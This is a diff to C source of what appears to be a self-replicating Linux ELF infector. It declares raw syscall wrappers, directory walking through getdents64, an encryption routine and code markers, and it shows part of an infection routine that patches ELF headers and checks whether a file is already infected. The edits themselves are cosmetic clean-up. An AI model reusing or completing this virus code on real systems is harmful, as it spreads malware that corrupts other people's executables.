@@ -48,8 +48,6 @@ char *ft_strnstr(char *s1, char *s2, size_t n);
 int ft_strcmp(const char *s1, const char *s2);
 
 #define PAGE_SIZE (0x2000)
-#define PAGE_SZ64 PAGE_SIZE
-
 # define __syscall6(type, name, type1, arg1, type2, arg2, type3, arg3, type4, arg4, type5, arg5, type6, arg6)\
 type name(type1 arg1,type2 arg2, type3 arg3, type4 arg4, type5 arg5, type6 arg6)\
 {\
@@ -106,36 +104,22 @@ return i;\
 }
 
 ssize_t read(int fd, void *buf, size_t count);
-
 int close(int fd);
-
 int exit(int status);
-
 int fstat(int fd, struct stat *statbuf);
-
 int rename(const char *oldpath, const char *newpath);
-
 ssize_t read(int fd, void *buf, size_t count);
-
 int open(const char *pathname, int flags, mode_t mode);
-
 int getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                unsigned int count);
-
 void main_encrypt();
-
 void *mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd,
            unsigned long offset);
-
 ssize_t write(int fd, const void *buf, size_t count);
-
-
 unsigned long get_eip(void);
-
 extern int yeah;
 extern int real_start;
 extern int myend;
-
 extern int do_main(void);
 
 int _start() {
@@ -653,7 +637,7 @@ int do_the_job(char buff[], size_t size, char *path, unsigned int *n_loaded) {
 
 	phdr = (Elf64_Phdr * )(buff + hdr->e_phoff);
 
-	hdr->e_shoff += PAGE_SZ64;
+	hdr->e_shoff += PAGE_SIZE;
 	size_t padding_before = 0;
 	for (int i = 0; i < hdr->e_phnum - 1; i++) {
 		if (is_infected(buff + phdr[i].p_offset, phdr[i].p_filesz))
